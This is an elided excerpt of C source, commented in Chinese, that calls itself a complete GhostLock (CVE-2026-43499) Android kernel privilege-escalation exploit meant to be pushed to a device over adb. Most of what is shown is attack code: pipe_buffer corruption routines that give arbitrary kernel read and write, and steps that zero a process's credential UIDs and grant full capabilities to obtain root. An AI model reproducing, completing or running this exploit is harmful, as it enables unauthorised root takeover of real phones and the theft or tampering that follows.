/**
 * ghostlock_complete.c — 完整 GhostLock 内核提权利用程序
 *
 * 整合:
 ...
 * 运行: adb push ghostlock_complete /data/local/tmp/
 *       adb shell /data/local/tmp/ghostlock_complete
 */
...
static int pipe_fds_reclaim[15][2];
...
static int pipe_phys_read(int fd, int pipefd[2], uintptr_t buf_addr,
    ...
    /* 保存原始 pipe buffer */
    struct pipe_buffer saved;
    if (pread(fd, &saved, sizeof(saved), buf_addr) != sizeof(saved)) {
        return 0;
    }

    /* 修改 pipe buffer 指向目标地址 */
    struct pipe_buffer pb = saved;
    pb.page = (direct_addr >> 12) << 12;  /* 页对齐 */
    pb.offset = direct_addr & 0xFFF;
    pb.len = len + 1;
    pb.ops = 0;  /* anon_pipe_buf_ops */
    pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
    pb.private = 0;

    /* 写入修改后的 pipe buffer */
    if (pwrite(fd, &pb, sizeof(pb), buf_addr) != sizeof(pb)) {
        return 0;
    }
    ...
    /* 恢复原始 pipe buffer */
    pwrite(fd, &saved, sizeof(saved), buf_addr);
    return ok;
}
 ...
 * 读取 64 位内核值
 */
static uint64_t pipe_read64(int fd, int pipefd[2], uintptr_t buf_addr,
                            uintptr_t direct_addr) {
    uint64_t value = 0;
    pipe_phys_read(fd, pipefd, buf_addr, direct_addr, &value, sizeof(value));
    return value;
}
 ...
 * 写入 64 位内核值
 */
static int pipe_write64(int fd, int pipefd[2], uintptr_t buf_addr,
                        uintptr_t direct_addr, uint64_t value) {
    return pipe_phys_write(fd, pipefd, buf_addr, direct_addr, &value, sizeof(value));
}
...
static int redirect_pi_blocked_on(void) {
    ...
    /* pipe_read64(physrw_fd, pipefd, buf_addr, addr); */
    /* pipe_write64(physrw_fd, pipefd, buf_addr, addr, spray_addr); */
...
static int escalate_to_root(void) {
    ...
    /* uint64_t cred = pipe_read64(physrw_fd, pipefd, buf_addr, cred_addr); */
    /* pipe_write64(physrw_fd, pipefd, buf_addr, cred + CRED_UID_OFF, 0); */
    /* pipe_write64(physrw_fd, pipefd, buf_addr, cred + CRED_UID_OFF + 4, 0); */
    /* pipe_write64(physrw_fd, pipefd, buf_addr, cred + CRED_CAPS_OFF, CAP_FULL); */
...
int main(int argc, char **argv) {
    printf("========================================\n");
    printf("  GhostLock CVE-2026-43499 Complete Exploit\n");
